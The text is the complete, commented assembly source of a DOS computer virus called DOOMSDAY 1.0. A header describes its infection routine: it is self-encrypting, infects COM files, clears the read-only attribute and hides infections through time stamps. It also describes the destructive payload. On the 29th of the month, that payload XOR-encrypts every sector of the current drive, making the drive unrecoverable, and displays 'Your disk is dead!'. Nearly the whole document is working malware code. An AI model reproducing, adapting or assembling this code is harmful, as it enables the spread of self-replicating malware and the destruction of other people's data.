﻿

;DOOMSDAY.COM

;This virus is DOOMSDAY 1.0.

;This file is to be assembled under TASM v2.0 using the /m2 switch.

;NOTE:  Once this code is assembled, linked, and translated into a COM
;file, the virus is not completely ready for use.  The resulting COM file
;will infect a file in the root directory of the current drive, creating a
;fully operational version of the virus.  The COM file will then hang the
;system, forcing a reboot.  The newly infected file will not cause the 
;system to hang and will function normally.

;This virus is a generic, non-resident, parasitic, self-encrypting COM
;infector.  It is extremely destructive when it activates.  USE CARE!!

;When the virus is first executed, it searches for uninfected COM files
;in the root directory.  Files are determined to be infected by checking
;the time stamp of the file.  If the seconds portion of the stamp is equal
;to 28 seconds, then the file is assumed to be infected.  If no uninfected
;files are found in the root directory, then the current directory is
;searched.  If no uninfected files are found in the current directory, then
;the activation criteria of the virus is checked.  If an uninfected file
;is found, the virus saves the time and date of the file.  The attributes
;of the file are also stored.  If the file is marked read only, the virus
;will adjust the attributes so that the file can be modified.  It then
;opens the file and reads in the first four bytes of the file and stores
;them within the viral code.  The length of the file is determined and
;necessary memory locations within the virus are adjusted.  The virus
;calculates a jump instruction to execute the virus first.  This three
;byte instruction is then written over the first three bytes of the file 
;to be infected.  An encryption key for the virus is then calculated
;and stored as the fourth byte of the infected program.  Using this key,
;the first section of the virus is encrypted in memory.  This encrypted
;section of viral code is then written to the end of the file.  The
;second section of viral code is then copied over the first section of
;viral code in memory.  Control of the virus is then transferred to
;this newly written second section.  This second section then proceeds
;to encrypt the old second section of viral code in memory.  When this
;is complete, the encrypted second section is then written to the end of
;the file to infect where the first section left off.  The time stamp 
;is adjusted to show 28 seconds.  The time/date stamp is then set to the
;newly infected file and the file is closed.  Note that when doing the
;directory listing of files on disk, the file's time and date will appear
;to be unchanged since the seconds portion of the file time and date is
;never displayed.  The original files attributes are then reset for the 
;newly infected file.

;If no uninfected COM files can be found, the activation criteria is checked.
;The virus will activate on the 29th day of any month.  Note that as long as
;a file can be infected, the virus will not activate.  When it is determined
;that the virus should activate, the destructive portion of the virus is
;copied to 0100 hex in memory.  This is done so that their is plenty of memory
;within the segment for the destructive code to function normally.  Control
;is then transferred to this newly copied code.  The destructive code then
;proceeds to read in logical sectors of the current drive starting with
;logical sector 0.  Five sectors are read into memory at a time.  These five
;sectors in memory are then XORed with hex value AB.  These encrypted
;sectors are then written back over the original sectors of the current drive.
;The next five logical sectors are then treated the same way and the process
;continues until the entire drive is done.  Note that once the sectors are
;encrypted, its unfeasible to retrieve the original sectors.  This in effect
;totally destroys the current disk.  Shortly after the destruction begins,
;a message identifying the virus and a declaration that the disk is dead is
;displayed on screen.

;NOTES:
;     This virus only infects com files.
;     Files will only be infected if their length is over 255 bytes and less
;          than 61440 bytes.
;     The virus is self-encrypting and is entirely different with each
;          infection except for the bit of code which decrypts the virus.
;     Files marked read-only can also be infected.
;     It can be extrememly destructive.

.model tiny
.code

codelen       equ end_of_code-begin
start         equ begin-engine+0100h

engine:                       ;This is basically the host program for the
     jmp decrypt              ;virus.  The first 3 bytes is a jump to the
     nop                      ;virus code.  The 4th byte is the decode value
     db 00                    ;for the virus.  When the virus executes, the
     int 20                   ;first four bytes will be replaced with the
                              ;host program code which consists of 4 nop
                              ;instructions.


decrypt:                      ;This section of code decrypts the virus.
                              ;The virus is decrypted from the end of the
                              ;virus to just after the decryption section of
                              ;code.

     mov al,ds:[0103h]        ;Get the decryption key for the virus in AL.
     mov cx,codelen           ;Move the number of bytes to decrypt in CX.
mod_area_1:
     mov si,start-1           ;Move the location to begin decryption into SI.
                              ;SI will contain the location of the virus from
                              ;which relative calculations are made and is the
                              ;key to the virus being self-relocatable.  This
                              ;value is 1 less than the start of the virus.
                              ;This means that for correct calculations to be
                              ;made, 1 must be added into equations involving
                              ;SI.
l1:
     mov bx,cx                ;Move remaining decryption bytes into BX.
     sub [bx+si],al           ;Subtract the decrypt key from encrypted byte.
     loop l1                  ;Loop back for next byte to decrypt.



begin:                        ;The start of the virus.
     jmp code_start           ;Jump over text strings to virus meat.
version:
     db 'v04'                 ;Virus version number 4.
four_bytes:
     db 90h,90h,90h,90h       ;The first four bytes of the host program.
search_spec:
     db '\*.com',0            ;Search string for files to infect.
file_name:
     db '\xxxxxxxx.xxx',0     ;Location where filename to infect is stored.
puzzle:
     db 'A scion to none$'
     db 'Certainly no fun$'
     db 'Total destruction when done$'
     db 'Introducing DOOMSDAY ONE$'
     db 'Written in Orlando, FL on 05/13/91$'

disk_kill:
     mov ah,2ah
     int 21h
     cmp dl,29
     je reloc_kill
     call jump_top

reloc_kill:
     mov di,0100h
     add si,killer-begin+1
     mov cx,end_kill-killer
     rep movsb
     call jump_top

jump_top:
     mov dx,0100h
     push dx
     ret

killer:
     jmp kill_start
message1:
     db 'Your disk is dead!$'
message2:
     db 'Long live DOOMSDAY 1.0$'

kill_start:
     mov ah,36h
     xor dl,dl
     int 21h
     mov ax,5
     mul cx
     push ax
     mov ah,19h
     int 21h
     xor dx,dx
kill_more:
     mov cx,5
     mov bx,200h
     push ax
     push dx
     int 25h
     jb dead_disk
     popf
     pop dx
     pop ax
     pop cx
     push cx
dkl_1:
     mov bx,0200h
     add bx,cx
     xor byte ptr[bx],0abh
     loop dkl_1
     mov cx,5
     dec bx
     push ax
     push dx
     int 26h
     popf
     pop dx
     pop ax
     add dx,5
     cmp dx,2dh
     jz disp_message
     jmp kill_more
disp_message:
     push ax
     push dx
     mov ax,0600h
     xor cx,cx
     mov dx,184fh
     mov bh,7
     int 10h
     mov ah,2
     mov dx,0a1fh
     xor bh,bh
     int 10h
     mov dx,message1-killer+0100h
     mov ah,9
     int 21h
     mov ah,2
     mov dx,0c1dh
     int 10h
     mov dx,message2-killer+0100h
     mov ah,9
     int 21h
     pop dx
     pop ax
     jmp kill_more
dead_disk:
     int 20h
end_kill:


code_start:                   ;The meat of the virus begins here.
     cld                      ;Clear the direction flag.
     mov dx,[si+four_bytes-begin+1] ;Move first two bytes of host program into DX.
     mov ds:[0100h],dx        ;Write first two bytes of host back to host.
     mov dx,[si+four_bytes-begin+3] ;Move 3rd and 4th bytes of host into DX.
     mov ds:[0102h],dx        ;Write 3rd and 4th bytes of host back to host.


create_DTA:                   ;Create a new disk transfer area for the virus
                              ;to use.  This area is created at the end of
                              ;the virus with 6 bytes between the end of the
                              ;virus and the start of the DTA.  This six bytes
                              ;is used by the virus as a variable area and is
                              ;referred to as the virus work area or VWA.
                              ;These variables are collectively referred to
                              ;as VWA1 through VWA6.
     mov dx,si                ;Move into DX the start of the virus.
     add dx,codelen+1+7       ;Add to DX virus length and 7 for VWA.
     mov ah,1ah               ;Move into AH the code to create DTA.
     int 21h                  ;Create new disk transfer area.



zero_VWA1:                    ;VWA1 is used to keep track of which directory
                              ;is currently being used for file search and
                              ;infection.  When VWA1 is zero, the root
                              ;directory is in use.  When VWA1 is one, the
                              ;current directory is in use.
     mov word ptr[si+codelen+1],0



first_search:                 ;This section of code searches for files to
                              ;infect.
     mov ah,4eh               ;Move into AH the code for initial file search.
continue_search:
     xor cx,cx                ;Zero CX.
     mov dx,si
     add dx,[si+codelen+1]
     add dx,search_spec-begin+1     ;Set DX to point to search string for files.
     int 21h                  ;Search for a file to infect.

     jnc check_file           ;If a file was found, jump to check_file area.
                              ;If not, then check to see if were searching the
                              ;root directory or the current directory.
     cmp byte ptr[si+codelen+2],1
                              ;Check VWA1 for either current or root.
     jne chg_current          ;If current searched, then jump to disk_kill.
     jmp disk_kill

chg_current:
     mov byte ptr[si+codelen+2],1
                              ;Otherwise, set VWA1=1 so next search will be
                              ;with the current directory.
     jmp first_search         ;Jump to first_search.


next_search:                  ;This section of code sets AH to continue
                              ;searching for candidate files to infect.
     mov ah,4fh               ;Set AH to continue search.
     jmp continue_search      ;Jump to continue_search.



check_file:                   ;This section of code checks to see if the file
                              ;is suitable for infection.  If the file is less
                              ;than 255 bytes or greater than 61440 bytes or
                              ;already infected, then the file is skipped and
                              ;the search continues for another COM file.
                              ;Infection is determined by the date/time stamp
                              ;of the file.  When a file is infected, the
                              ;virus preserves the original file date and
                              ;time except for the seconds.  When a file is
                              ;infected, the seconds marker is set to 28.
                              ;This cannot be seen with normal DOS commands as
                              ;the seconds marker is never shown.
     mov dx,[si+codelen+1+29] ;Set DX to candidate file's date/time in DTA.
     and dl,31                ;Clear out all but the seconds marker.
     cmp dl,14                ;Check to see if seconds marker is 28.
     je next_search           ;If so, then continue the search for next file.
     cmp word ptr[si+codelen+1+33],00ffh
                              ;Compare length of file in DTA with 255.
     jb next_search           ;If less than 255, then continue the search.
     cmp word ptr[si+codelen+1+33],0f000h
                              ;Compare length of file in DTA with 61440.
     ja next_search           ;If greather than 61440 then, continue search.


infect_file:                  ;This section of code infects the candidate
                              ;file.  Crucial memory locations are written
                              ;into the virus and key values are stored.
                              ;The first four bytes of the candidate file
                              ;are stored within the virus.  These four bytes
                              ;are then overwritten by a far jump to the
                              ;virus code and the encryption key for the
                              ;virus.  The first half of the virus is
                              ;encrypted and written to the file.  The
                              ;second half of the virus is then relocated over
                              ;the first half and control transfers there.
                              ;The second half of the original location of the
                              ;virus is then encrypted and written to the
                              ;candidate file.  The seconds marker of the file
                              ;is then adjusted to show for an infection.
     mov dx,[si+codelen+1+29] ;Set DX to the time stamp of the file in DTA.
     push dx                  ;Push the time stamp of the candidate file.
     mov dx,[si+codelen+1+31] ;Set DX to the date stamp of the file in DTA.
     push dx                  ;Push the date stamp of the candidate file.
     mov dx,[si+codelen+1+33] ;Set DX to the length of the file in DTA.
     push dx                  ;Push the length of the candidate file.
     mov byte ptr[si+codelen+1+3],0e9h;Set VWA3 to the hex code for a far jump.
     sub dx,3                 ;Subtract 3 from the length of the file.
     mov [si+codelen+1+4],dx  ;Move this value to VWA4 and VWA5.
                              ;This is the jump statement to be written over
                              ;the first three bytes of the candidate file and
                              ;is essentially a jump to the virus code.
     pop dx                   ;Set DX equal to the length of the file.
     push dx                  ;Store this length again in the stack.
                              ;NOTE:The length of the file is stored only once
                              ;in the stack.
     add dx,100h+begin-decrypt-1
                              ;Set DX to the memory location the virus will
                              ;occupy in the candidate file.  This is the key
                              ;value to the virus being relocatable and is the
                              ;value to which SI will be set when the virus is
                              ;executed.
     mov [si+mod_area_1-begin+1+1],dx
                              ;Store this value within the virus code.  This
                              ;value will be stored within the MOV instruction
                              ;where SI receives its initial value.
     mov di,si                ;Set DI equal to SI.
     push si                  ;Push SI
     add si,codelen+1+37      ;Set SI to the location of filename in DTA.
     add di,file_name-begin+1+1      ;Set DI to the location to copy the filename.
     mov dx,di                ;Set DX equal to the filename locaton.
     mov cx,13                ;Set CX to 13.  (The length of the filename).
     rep movsb                ;Move the filename to the filename location
                              ;within the virus code.
     pop si                   ;Pop SI.  (The original virus memory location).
     sub dx,1                 ;Set DX equal to the filename location minus 1.
                              ;This in effect sets DX equal to the location
                              ;of the filename along with the root directory
                              ;search spec.  When VWA1 is added to this value,
                              ;DX will be set either to open the file in the
                              ;current directory or the root directory.
     add dx,[si+codelen+1]    ;Add VWA1 to DX.

get_attrib:
     mov ax,4300h
     int 21h
     mov byte ptr[si+codelen+1+2],cl
     and cl,254
     mov ax,4301h
     int 21h

     mov ax,3d02h             ;Set AX to open the file for read/write access.
     int 21h                  ;Open the file.
     mov bx,ax                ;Move the open file handle to the BX register.
     mov dx,si                ;Set DX equal to SI (key virus memory location).
     add dx,four_bytes-begin+1      ;Set DX to location where 1st 4 bytes of file
                              ;are to be stored in the virus.
     mov cx,4                 ;Set CX to read 4 bytes.
     mov ah,3fh               ;Set AX to read from open file.
     int 21h                  ;Read 1st 4 bytes of file into the virus.


get_time:                     ;This section of code gets the current time
                              ;in preparation to encrypt the virus.  The
                              ;encryption key is based upon this value.
                              ;The encryption key is derived by adding the
                              ;seconds, hundreth's of seconds and the minutes.
                              ;To this value is then added one in order to
                              ;ensure an encryption value other than zero.
                              ;If the encryption value were allowed to be
                              ;zero, then the virus would not be encrypted.
     mov ah,2ch               ;Set AH to the code to get the current time.
     int 21h                  ;Get the current time.
     add dl,dh                ;Add the seconds to the hundred's of seconds.
     add dl,cl                ;Add the minutes to this value.
     add dl,1                 ;Add 1 to this value.  This is the encrypt key.
     mov [si+codelen+1+6],dl  ;Set VWA6 equal to the encrypt key.  Recall
                              ;that VWA3-VWA5 is a jump instruction which
                              ;will be written over the first three bytes of
                              ;the file.  VWA3-VWA6 is now set to be the first
                              ;four bytes to be written over the start of the
                              ;file.
     xor cx,cx                ;Zero CX.  (This plus DX is the number of bytes
                              ;to move the file pointer).
     xor dx,dx                ;Zero DX.
     mov ax,4200h             ;Set AX to move file ptr from the file start.
     int 21h                  ;Move the file pointer to the beginning of file.
     mov cx,4                 ;Set CX to 4.  (Number of bytes to write).
     mov dx,si                ;Set DX to SI.
     add dx,codelen+1+3       ;Set DX to point to VWA3.
     mov ah,40h               ;Set AH to write to the file.
     int 21h                  ;Write VWA3-VWA6 to the 1st 4 bytes of the file.
     jmp encode_1a            ;Jump over the next jump instruction.  This is
                              ;done so that when control is transferred to the
                              ;second half of the virus after relocation, the
                              ;virus can continue where it left off.  This
                              ;reduces some of the mess involved with trying
                              ;to figure memory locations of where to transfer
                              ;control.


encode_1:                     ;This section of code begins the encryption
                              ;process of the virus.  Basically, everything up
                              ;to this point will be encrypted and then
                              ;written to the file.  The remaining portion of
                              ;the virus will then be copied over the first
                              ;portion.  Control will then transfer there
                              ;where the original second half will be
                              ;encrypted and written to the file.
     jmp control_jump         ;Jump to location where second half of virus
                              ;left off.  This jump is executed after the 2nd
                              ;half has been copied over the 1st half.


encode_1a:
     mov al,[si+codelen+1+6]  ;Set AL to VWA6 (The encryption key).
     mov cx,encode_1-begin    ;Set CX to number of virus bytes to encode.
                              ;(The first half).
     push bx                  ;Save the current file handle in the stack.
l2:
     mov bx,cx                ;Set BX equal to number of bytes to encrypt.
     add [bx+si],al           ;Encrypt from encode_1 back to begin.
     loop l2                  ;Loop back to encrypt next byte.


write_1st:                    ;This section of code writes the now encrypted
                              ;1st half of the virus to the file.
     pop bx                   ;Pop the file handle back into BX.
     xor cx,cx                ;Zero CX.  Offset to move file pointer.
     xor dx,dx                ;Zero DX.  Also the offset to move file pointer.
     mov ax,4202h             ;Set AX to move file pointer from end of file.
     int 21h                  ;Move the file pointer to the end of the file.
     mov cx,encode_1-decrypt  ;Set CX to length of 1st half plus the decrypt
                              ;section of virus code.
     mov dx,si                ;Set DX equal to SI.
     sub dx,begin-decrypt-1   ;Set DX equal to location of start of decrypt.
     push dx                  ;Push the start location of decrypt.
     mov ah,40h               ;Set AX to write to the file.
     int 21h                  ;Write the encryped 1st half and the decrypt
                              ;section of code to the end of the file.

xfer_2nd:                     ;This section of code copies the 2nd portion
                              ;of the virus over the 1st portion.
     pop di
     push si
     add si,encode_1-begin+1  ;Set SI equal to the start location of 2nd half.
     mov cx,end_of_code-encode_1
                              ;Set CX equal to length of 2nd half of virus.
     rep movsb
     jmp decrypt              ;Transfer control to the relocated 2nd half.

control_jump:
     pop si
     pop dx
     add dx,end_of_code-encode_1-3
     neg dx
     mov [si+end_of_code-begin+1-5],dx



encode_2:
     mov al,[si+codelen+1+6]
     mov cx,end_of_code-encode_1
     push bx
     push cx
l3:
     mov bx,cx
     add [bx+si+encode_1-begin],al
     loop l3


write_2nd:
     pop cx
     pop bx
     mov dx,si
     add dx,encode_1-begin+1
     mov ah,40h
     int 21h


adjust_stamp:
     pop dx
     pop cx
     and cl,224
     or cl,14
     mov ax,5701h
     int 21h

close_file:
     mov ah,3eh
     int 21h

set_attrib:
     mov bx,si
     add bx,codelen+1+36
     mov byte ptr[bx],'\'
     add bx,[si+codelen+1]
     mov dx,bx
     mov cl,byte ptr[si+codelen+1+2]
     mov ax,4301h
     int 21h

goto_engine:
     jmp engine
     db 'dex'
end_of_code:
     END

